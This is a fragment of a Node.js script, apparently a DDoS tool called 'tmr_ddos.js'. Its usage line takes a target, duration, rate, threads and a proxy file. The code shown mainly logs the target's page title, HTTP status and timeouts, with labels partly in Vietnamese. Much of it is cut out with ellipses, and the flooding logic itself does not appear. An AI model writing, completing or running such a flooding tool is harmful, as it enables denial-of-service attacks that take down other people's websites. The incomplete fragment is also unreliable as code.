 ...
 if (process.argv.length < 7){console.log(`node tmr_ddos.js target time rate thread proxy.txt`); process.exit();}
 const headers = {};
 ...
 const getCurrentTime = () => {
  ...
  Promise.race([axiosPromise, timeoutPromise])
    .then((response) => {
      ...
      console.log(` ${getCurrentTime()} \x1b[35mTiêu Đề Website\x1b[0m: ${getTitleFromHTML(data)} (\x1b[32m${status}\x1b[0m)`);
    })
    .catch((error) => {
      if (error.message === '\x1b[31mRequest timed out\x1b[0m') {
        console.log(`\x1b[35m\x1b[0m ${getCurrentTime()} Request Timed Out`);
      } else if (error.response) {
        const extractedTitle = getTitleFromHTML(error.response.data);
        console.log(` ${getCurrentTime()} \x1b[35mTiêu Đề Website\x1b[0m: ${extractedTitle} (\x1b[31m${error.response.status}\x1b[0m)`);
      } else {
        console.log(` ${getCurrentTime()} \x1b[31m${error.message}\x1b[0m`);
      }
    });
}
